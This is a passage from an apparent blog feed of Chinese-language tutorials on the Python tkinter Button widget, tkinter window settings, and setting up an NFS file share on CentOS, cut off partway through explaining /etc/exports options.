        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Button是tkinter中的按钮控件,是用这个按钮可以实现程序与用户的交互，用户如果点击按钮,程序会执行相应规定好的事件函数, 事件函数可以为开发人员自定义的函数。</p><p>Button使用起来很简单，它可以包含文本、图像、位图，感觉是一个可以点击的Label，就是多了一个<code>command</code>参数设置,通过该设置可以规定对应按钮的事件函数。</p><p>先来一段代码:</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> messagebox  <span class="comment"># Button经常会和messagebox控件一起使用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alert</span>():  <span class="comment"># 定义事件函数</span></span><br><span class="line">    messagebox.showinfo(title=<span class="string">'hello'</span>, message=<span class="string">'Hello world'</span>) <span class="comment">#弹出消息框，标题为hello，消息为Hello world</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root = Tk()</span><br><span class="line">root.title(<span class="string">'点击按钮会有弹窗'</span>)</span><br><span class="line">Button(root, text=<span class="string">'点我'</span>, command=alert).pack(side=<span class="string">'bottom'</span>)  <span class="comment"># 定义一个Button控件，并把它放入窗口底部</span></span><br><span class="line">mainloop()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220430204319092.png" alt="运行结果"></p><p>可以看到点击后立刻触发了事件函数，调用了messagebox控件的showinfo函数，弹出了消息为Hello world的提示窗</p><h2 id="Button定义方式"><a href="#Button定义方式" class="headerlink" title="Button定义方式:"></a>Button定义方式:</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bt=Button(master,option,……)</span><br></pre></td></tr></tbody></table></figure><p>和Label控件一样, 其中master为父容器，option为可以设置的属性</p><p>我们看一下Button控件有哪些可以设置的属性</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(bt.keys())</span><br></pre></td></tr></tbody></table></figure><p>结果如下:</p><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">['activebackground', 'activeforeground', 'anchor', 'background', 'bd', 'bg', 'bitmap', 'borderwidth', 'command', 'compound', 'cursor', 'default', 'disabledforeground', 'fg', 'font', 'foreground', 'height', 'highlightbackground', 'highlightcolor', 'highlightthickness', 'image', 'justify', 'overrelief', 'padx', 'pady', 'relief', 'repeatdelay', 'repeatinterval', 'state', 'takefocus', 'text', 'textvariable', 'underline', 'width', 'wraplength']</span><br></pre></td></tr></tbody></table></figure><p>可以发现大部分参数与Label还是没有太大差别的</p><p>常用的属性与其意义如下:</p><table><thead><tr><th>属性</th><th>意义</th></tr></thead><tbody><tr><td>anchor</td><td>控制文本所在的位置，默认为中心位置（CENTER）</td></tr><tr><td>activebackground</td><td>当鼠标放在按钮上时候，按妞的背景颜色</td></tr><tr><td>activeforeground</td><td>当鼠标放在按钮上时候，按钮的前景色</td></tr><tr><td>bd</td><td>钮边框的大小，默认为 2 个像素</td></tr><tr><td>bg</td><td>按钮的背景色</td></tr><tr><td>fg</td><td>按钮的前景色</td></tr><tr><td>font</td><td>按钮文本的字体样样式</td></tr><tr><td>height</td><td>按钮的高度</td></tr><tr><td>highlightcolor</td><td>按钮控件高亮处要显示的颜色</td></tr><tr><td>image</td><td>按钮上要显示的图片</td></tr><tr><td>justify</td><td>按钮显示多行文本时，用来指定文本的对齐方式，参数值有 LEFT/RIGHT/CENTER</td></tr><tr><td>padx/pady</td><td>padx 指定 x 轴（水平方向）的间距大小，pady 则表示 y轴（垂直方向）的间距大小</td></tr><tr><td>ipadx/ipady</td><td>ipadx 指标签文字与标签容器之间的横向距离；ipady 则表示标签文字与标签容器之间的纵向距离</td></tr><tr><td>state</td><td>设置按钮的可用状态，可选参数有NORMAL/ACTIVE/DISABLED，默认为 NORMAL</td></tr><tr><td>text</td><td>按钮控件要显示的文本</td></tr></tbody></table><p>我们打印看一下Button比Label多了那些设置</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">lb = Label()</span><br><span class="line">bt = Button()</span><br><span class="line">lb_set = <span class="built_in">set</span>(lb.keys())</span><br><span class="line">bt_set = <span class="built_in">set</span>(bt.keys())</span><br><span class="line"><span class="built_in">print</span>(bt_set.difference(lb_set))</span><br></pre></td></tr></tbody></table></figure><p>结果:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">{'default', 'command', 'repeatinterval', 'repeatdelay', 'overrelief'}</span><br></pre></td></tr></tbody></table></figure><table><thead><tr><th>属性</th><th>意义</th></tr></thead><tbody><tr><td>default</td><td>若设置此属性，则该按钮为默认按钮, 值可以为active, disabled, or normal</td></tr><tr><td>command</td><td>指定按钮被点击时调用的函数。</td></tr><tr><td>repeatinterval</td><td>重复间隔，repeatinterval需要和repeatdelay一起使用才能凑效.作用就是长按按钮时,间隔repeatinterval(ms),执行相应动作.</td></tr><tr><td>repeatdelay</td><td>表示点击按钮后,延迟repeatdelay(ms),做出相应动作.</td></tr><tr><td>overrelief</td><td>当鼠标飘过按钮时,按钮的边框的显示样式</td></tr></tbody></table><p>Button控件还有几种常用的方法</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>deselect()</td><td>清除单选按钮的状态</td></tr><tr><td>flash()</td><td>在激活状态颜色和正常颜色之间闪烁几次单选按钮，但保持它开始时的状态。</td></tr><tr><td>invoke()</td><td>可以调用此方法来获得与用户单击单选按钮以更改其状态时发生的操作相同的操作</td></tr><tr><td>select()</td><td>设置单选按钮为选中。</td></tr><tr><td>focus()</td><td>设置焦点</td></tr></tbody></table><h2 id="简单应用"><a href="#简单应用" class="headerlink" title="简单应用"></a>简单应用</h2><h3 id="1"><a href="#1" class="headerlink" title="1)"></a>1)</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> messagebox</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">button_left</span>():</span><br><span class="line">    messagebox.showwarning(<span class="string">'wrong!'</span>, <span class="string">'you have make some mistakes'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">button_right</span>():</span><br><span class="line">    messagebox.showinfo(<span class="string">'yes!'</span>, <span class="string">'you are right!!'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root = Tk()</span><br><span class="line">root.title(<span class="string">'a button'</span>)</span><br><span class="line">Label(root, text=<span class="string">'猜猜哪个是对的?'</span>, bg=<span class="string">'lightblue'</span>).grid(row=<span class="number">1</span>, column=<span class="number">3</span>)</span><br><span class="line">Button(root, text=<span class="string">'A'</span>, bg=<span class="string">'#abe88d'</span>, command=button_left).grid(row=<span class="number">3</span>, column=<span class="number">1</span>)</span><br><span class="line">Button(root, text=<span class="string">'B'</span>, bg=<span class="string">'#427ef6'</span>, command=button_right).grid(row=<span class="number">3</span>, column=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">mainloop()</span><br></pre></td></tr></tbody></table></figure><p>效果如下:</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220430213133798.png" alt="效果"></p><p>点击A:</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220430212923753.png" alt="点击A"></p><p>点击B:</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220430212955540.png" alt="点击B"></p><h3 id="2"><a href="#2" class="headerlink" title="2)"></a>2)</h3><p>使用Button还可以使界面的控件产生变化</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>():</span><br><span class="line">    <span class="keyword">if</span> lb[<span class="string">'text'</span>] == <span class="string">'注意这里!!'</span>:  <span class="comment"># 这里使用了if判断，目的就是为了点击按钮可以在两者之间来回切换</span></span><br><span class="line">        lb.config(text=<span class="string">'我变了呀'</span>, bg=<span class="string">'#bfe87d'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        lb.config(text=<span class="string">'注意这里!!'</span>, bg=<span class="string">'lightblue'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root = Tk()</span><br><span class="line">root.geometry(<span class="string">'400x400'</span>)</span><br><span class="line">lb = Label(root, text=<span class="string">'注意这里!!'</span>, bg=<span class="string">'lightblue'</span>, font=(<span class="string">'微软雅黑'</span>, <span class="number">50</span>, <span class="string">'bold'</span>, <span class="string">'italic'</span>))</span><br><span class="line"><span class="built_in">print</span>(lb[<span class="string">'text'</span>])</span><br><span class="line">lb.grid(row=<span class="number">1</span>, column=<span class="number">1</span>)</span><br><span class="line">Button(root, text=<span class="string">'点我试试看'</span>, padx=<span class="number">10</span>, pady=<span class="number">10</span>, command=change).grid(row=<span class="number">1</span>, column=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">mainloop()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>点击前：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220430231718475.png" alt="点击前"></p><p>点击后：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220430231828412.png" alt="点击后"></p><h3 id="3"><a href="#3" class="headerlink" title="3)"></a>3)</h3><p>按钮中的内容可以为文本，也可以为图片，也可以图片和文字混合。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">root = Tk()</span><br><span class="line">root.geometry(<span class="string">'400x400'</span>)</span><br><span class="line">image = PhotoImage(file=<span class="string">'./resources/button.png'</span>)</span><br><span class="line">Button(root, image=image, compound=LEFT, text=<span class="string">'点我退出窗口'</span>,</span><br><span class="line">       command=root.quit).pack()  <span class="comment"># command设置的事件函数为窗口的quit函数,可以实现用按钮关闭窗口的作用</span></span><br><span class="line"></span><br><span class="line">mainloop()</span><br></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220430233017535.png" alt="效果图"></p><p>点击按钮，触发窗口退出函数，会退出窗口。</p><h3 id="4）"><a href="#4）" class="headerlink" title="4）"></a>4）</h3><p>这里需要对command参数说明一下，command所配置的值是函数名，不能加括号，加了括号虽然有时不报错，但是这样窗体一运行对应的函数就会立刻执行。但是在一些场景中我们可能需要往事件函数中添加一些参数，这里就可以使用lambda匿名函数，具体如下:</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_var</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="keyword">global</span> var</span><br><span class="line">    var.<span class="built_in">set</span>(string)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root = Tk()</span><br><span class="line">root.geometry(<span class="string">'200x200'</span>)</span><br><span class="line">var = StringVar()</span><br><span class="line">var.<span class="built_in">set</span>(<span class="string">''</span>)</span><br><span class="line">Label(root, text=<span class="string">"你选择的是"</span>).grid(row=<span class="number">1</span>, column=<span class="number">1</span>)</span><br><span class="line">Label(root, textvariable=var, bg=<span class="string">'lightblue'</span>).grid(row=<span class="number">1</span>, column=<span class="number">2</span>)</span><br><span class="line">Button(root, text=<span class="string">'A'</span>, command=<span class="keyword">lambda</span>: change_var(<span class="string">'A'</span>)).grid(row=<span class="number">2</span>, column=<span class="number">2</span>)</span><br><span class="line">Button(root, text=<span class="string">'B'</span>, command=<span class="keyword">lambda</span>: change_var(<span class="string">'B'</span>)).grid(row=<span class="number">2</span>, column=<span class="number">3</span>)</span><br><span class="line">Button(root, text=<span class="string">'C'</span>, command=<span class="keyword">lambda</span>: change_var(<span class="string">'C'</span>)).grid(row=<span class="number">2</span>, column=<span class="number">4</span>)</span><br><span class="line">Button(root, text=<span class="string">'D'</span>, command=<span class="keyword">lambda</span>: change_var(<span class="string">'D'</span>)).grid(row=<span class="number">2</span>, column=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">root.mainloop()</span><br></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220501000558173.png" alt="效果图"></p><p>点击对应的按钮，标签lb2上就会出现对应的选项。</p><h2 id="tkinter-中的变量"><a href="#tkinter-中的变量" class="headerlink" title="tkinter 中的变量"></a>tkinter 中的变量</h2><p>上一个例子中StringVar()是tkinter中特有的变量</p><p>在tkinter中，有些控件 (比如 Entry 控件, Label控件等) 可以通过传入特定参数直接和一个程序变量绑定, 这些参数包括: variable, textvariable, onvalue, offvalue, value。<br>这种绑定是双向的: 如果该变量发生改变, 与该变量绑定的控件也会随之更新。<br>这些 Tkinter 控制变量和一般的 Python 变量一样, 都是用来保存某个值的. 但一般的 Python 变量不能被传递给 variable 或者 textvariable 参数. 这些参数可接受的类型仅限于 Tkinter 包中的 Variable 类的子类. 如下:</p><table><thead><tr><th>Variable</th><th>可以保存的变量</th></tr></thead><tbody><tr><td>StringVar()</td><td>保存一个String类型的变量</td></tr><tr><td>IntVar()</td><td>保存一个整型变量</td></tr><tr><td>DoubleVar()</td><td>保存一个浮点型变量</td></tr><tr><td>BooleanVar()</td><td>保存一个布尔型变量</td></tr></tbody></table><p>对于这类tkinter包中定义的变量，有两个方法：</p><ul><li><code>get()</code> :得到其保存的变量值</li><li><code>set()</code>设置其要保存的值</li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tkinter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PythonGUI编程之tkinter</title>
      <link href="/2022/05/31/pythonGUI%E7%BC%96%E7%A8%8B%E4%B9%8Btkinter%E6%A8%A1%E5%9D%97--%E7%AA%97%E4%BD%93/"/>
      <url>/2022/05/31/pythonGUI%E7%BC%96%E7%A8%8B%E4%B9%8Btkinter%E6%A8%A1%E5%9D%97--%E7%AA%97%E4%BD%93/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天突然对python的GUI编程产生兴趣，尤其是tkinter这个模块，第一次上手就感受到它的简洁，只需三行代码，即可搭建一个python程序的窗体：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tkinter <span class="comment"># 导入tkinter模块</span></span><br><span class="line">root=tkinter.Tk() <span class="comment"># 实例化一个窗体对象</span></span><br><span class="line">root.mainloop() <span class="comment"># 进入消息循环，维持窗体</span></span><br></pre></td></tr></tbody></table></figure><blockquote><p>也许有小伙伴不太了解什么是消息循环，在我看来，<code>mainloop()</code>的作用就是维持这个窗体，使它一直存在并显示着，直到用户关闭这个窗体。</p></blockquote><p>效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220424161147506.png" alt="窗体"></p><p>是不是感觉特别简洁？</p><p>当然，创建一个窗体只是GUI编程的开始，在接下几天我会抽空学习python的tkinter模块。</p><p>我所使用的环境：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tkinter</span><br><span class="line"><span class="built_in">print</span>(tkinter.TkVersion)</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8.6</span><br></pre></td></tr></tbody></table></figure><p>我使用的是tkinter8.6版本</p><h2 id="模块导入"><a href="#模块导入" class="headerlink" title="模块导入"></a>模块导入</h2><p>导入tkinter模块常用的三种方法</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tkinter  <span class="comment"># 直接把包导入</span></span><br><span class="line">root=tkinter.Tk()</span><br><span class="line">root.mainloop()</span><br></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> *  <span class="comment"># 把tkinter中所有的控件导入,这种导入方式的好处在于，一些tkinter中的规定的特殊字符可以直接使用，比如BOTTOM，TOP等等</span></span><br><span class="line">root=Tk()  </span><br><span class="line">root.mainloop()</span><br></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk  <span class="comment"># 取别名</span></span><br><span class="line">root=tk.Tk()</span><br><span class="line">root.mainloop()</span><br></pre></td></tr></tbody></table></figure><h2 id="自定义窗体"><a href="#自定义窗体" class="headerlink" title="自定义窗体"></a>自定义窗体</h2><p>上述的三行代码窗体属性设置都是默认的，我们还需要根据开发的不同场景来自定义窗体，调整窗体的设置。</p><p>下面我将用注释+代码进行说明</p><p><em>以下是我觉得经常会用到的：</em></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tkinter</span><br><span class="line">root = tkinter.Tk()</span><br><span class="line"><span class="comment"># 自定义窗体的标题</span></span><br><span class="line">root.title(<span class="string">'我的第一个窗口'</span>)</span><br><span class="line"><span class="comment"># 自定义窗体的图标（注意，这里的图标只能是ico结尾的图标文件,需自己事先创建图标，括号中写入图标的路径）</span></span><br><span class="line">root.iconbitmap(<span class="string">'./resources/ai.ico'</span>) </span><br><span class="line"><span class="comment"># 设置窗体大小及位置 窗体大小格式为"300x150",表示宽度300，高度150，中间必须是小写字母x；窗体在屏幕中显示的位置为"+800+200"，+800表示窗体距离左边界800，+200表示距离屏幕最上边为200。格式只能如上所述，否则会报错</span></span><br><span class="line">root.geometry(<span class="string">'300x150+800+200'</span>)</span><br><span class="line"><span class="comment"># root.resizable()是限制调节窗体的大小，第一个参数为False表示窗体宽度不能调节，第二个参数为False表示窗体高度不能调节。默认都为True,表示长宽都可调节</span></span><br><span class="line">root.resizable(<span class="literal">False</span>,<span class="literal">False</span>) <span class="comment"># 禁止调节窗体高度和宽度</span></span><br><span class="line">root.mainloop()</span><br></pre></td></tr></tbody></table></figure><p><em>窗体最大化，最小化以及隐藏设置：</em></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">root = Tk()</span><br><span class="line">root.minsize(<span class="number">200</span>, <span class="number">260</span>)  <span class="comment"># 设置窗口的最小尺寸（不带参数时获取最大值）</span></span><br><span class="line"><span class="comment"># root.maxsize(750, 650)  # 设置窗口的最大尺寸 （不带参数时获取最小值）</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">这里窗口状态函数state 有三个状态，分别为</span></span><br><span class="line"><span class="string">+ "zoomed"-窗口最大化</span></span><br><span class="line"><span class="string">+ "normal"-窗口正常化显示,默认为normal</span></span><br><span class="line"><span class="string">+ "icon" -窗口最小化</span></span><br><span class="line"><span class="string">注意: 只在windows系统上适用</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">root.state(<span class="string">'zoomed'</span>)  <span class="comment"># 最大化窗口</span></span><br><span class="line"><span class="comment"># root.state('icon')  # 最小化窗口</span></span><br><span class="line"><span class="comment"># root.iconify()  # 也可以最小化窗口</span></span><br><span class="line"><span class="comment"># root.attributes('-fullscreen', True)  # 全屏，没有标题栏,注意使用全屏时设置的最大尺寸(maxsize())不能过小</span></span><br><span class="line"><span class="comment"># root.withdraw()  # 隐藏窗体(任务栏中也不会显示)</span></span><br><span class="line"><span class="comment"># root.deiconify()  # 让隐藏或最小化的窗体再次显示或还原</span></span><br><span class="line">root.mainloop()</span><br></pre></td></tr></tbody></table></figure><p><em>其他的设置：</em></p><p><code>root.quite()</code>      退出窗口</p><p><code>root.update() </code>刷新窗口</p><p><code>root.after(second,command)</code>，自动触发事件，表示多少秒以后自动执行command指令</p><p><code>root.attributes("-toolwindow", True)</code> 设置为工具窗口(没有最大最小按钮)</p><p><code>root.attributes("-topmost", True)</code> 使窗口保持处于顶层</p><p><code>root.attributes(’-transparentcolor’,‘red’) </code>设置透明色，red可替换其他颜色</p><p><code>root.attributes(’-alpha’,0.5)</code> 设置窗口透明度，0~1之间</p><p><code>root[‘background’]=‘blue’</code> 设置窗口背景色，blue可替换其他颜色</p><p><code>root.overrideredirect(True) </code>隐藏窗口边框和标题栏（缺点：脱离windows窗口管理，窗口也不会出现在任务栏，且无法设置最大化、最小化，否则会报错）</p><p><code>root.winfo_screenwidth()</code> 获取屏幕分辩率（屏幕的宽）<br><code>root.winfo_screenheight()</code> 获取屏幕分辨率（屏幕的高）</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>个人认为，窗体的自定义设置还是比较重要的。需要考虑到用户的使用体验的话，就要注重窗体设置的美观。</p><p>这只是窗体，tkinter还有一些控件（widgets）等待我去学习。</p><p>哎，平时比较忙，只能偶尔抽空去学习这些我感兴趣的内容了。</p><p>附上我借鉴的一个学习tkinter模块的博客地址：</p><p><a href="http://www.wb98.com/">http://www.wb98.com</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tkinter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NFS部署</title>
      <link href="/2022/04/20/NFS%E9%83%A8%E7%BD%B2/"/>
      <url>/2022/04/20/NFS%E9%83%A8%E7%BD%B2/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是NFS"><a href="#什么是NFS" class="headerlink" title="什么是NFS"></a>什么是NFS</h2><blockquote><p>NFS,  网络文件系统，英文Network File System，是由<a href="https://baike.baidu.com/item/SUN/69463">SUN</a>公司研制的<a href="https://baike.baidu.com/item/UNIX/219943">UNIX</a><a href="https://baike.baidu.com/item/%E8%A1%A8%E7%A4%BA%E5%B1%82/4329716">表示层</a>协议(presentation layer protocol)，能使使用者访问网络上别处的文件就像在使用自己的计算机一样。</p></blockquote><p>NFS可以让服务端跟客户端通过网络共享主机磁盘上的一些数据，主要是在unix和linux系统上实现的一种文件共享方式。</p><p>我们可以简单的将NFS看做是一个文件服务器 (file server) 。这个 NFS 服务器可以让你的 PC 来将网络远程的 NFS  服务器分享的目录，挂载到本地端的机器当中， 在本地端的机器看起来，那个远程主机的目录就好像是自己的一个磁盘分区一样 (partition)。</p><p>NFS工作在OSI的会话层，端口号为111</p><h2 id="开始部署"><a href="#开始部署" class="headerlink" title="开始部署"></a>开始部署</h2><p>这里我用两台linux虚拟机做实验，一台为ubuntu（ip: 192.168.35.128），另一台为centos(ip:192.168.35.135)。用finalshell连接后开始进行部署。</p><h3 id="服务端部署（centos）"><a href="#服务端部署（centos）" class="headerlink" title="服务端部署（centos）"></a>服务端部署（centos）</h3><ol><li>首先要安装<code>nfs-utils</code></li></ol><p><code>yum -y install nfs-utils</code></p><p>rpcbind作为依赖包在此过程中也会被安装，因此无需再单独安装rpcbind。</p><ol start="2"><li>启动nfs,并将其设置为开机启动（作为服务器，应保证服务在每次重启之后都能迅速提供服务）</li></ol><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start nfs</span><br><span class="line">systemctl enable nfs</span><br></pre></td></tr></tbody></table></figure><p>这里不需要先启动rpc服务，使用<code>ps -ef|grep rpcbind</code>发现启动nfs之后rpcbind已经启动了。</p><ol start="3"><li>设置共享目录,并修改其权限</li></ol><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /data</span><br><span class="line">chmod 755 /data</span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>修改服务端配置文件(安装完nfs-utils后，会自动生成 /etc/exports这个文件，这是nfs主要的配置文件)</li></ol><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/exports</span><br></pre></td></tr></tbody></table></figure><p>按<code>i </code>插入如下内容：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/        192.168.35.0/24(rw,sync,no_root_sqush,no_all_squash)</span><br></pre></td></tr></tbody></table></figure><p><img src="https://cdn.jsdelivr.net/gh/jackieya/imgHosting/pic/image-20220412204843970.png" alt="配置修改"></p><p>配置相应主机对于这个共享文件夹所拥有的权限等内容，</p><p>/etc/exports具体文件内容格式如下</p><figure class="highlight tex"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;输出目录&gt; [客户端1 选项（访问权限,用户映射,其他）] [客户端2 选项（访问权限,用户映射,其他）]</span><br></pre></td></tr></tbody></table></figure><p>a. 输出目录：</p><p>输出目录是指NFS系统中需要共享给客户机使用的目录；</p><p>b. 客户端：</p><p>客户端是指网络中可以访问这个NFS输出目录的计算机</p><p>客户端常用的指定方式</p><ul><li>指定ip地址的主机：192.168.0.200</li><li>指定子网中的所有主机：192.168.0.0/24 192.168.0.0/255.255.255.0</li><li>指定域名的主机：david.bsmart.cn</li><li>指定域中的所有主机：*.bsmart.cn</li><li>所有主机：*</li></ul><p>c. 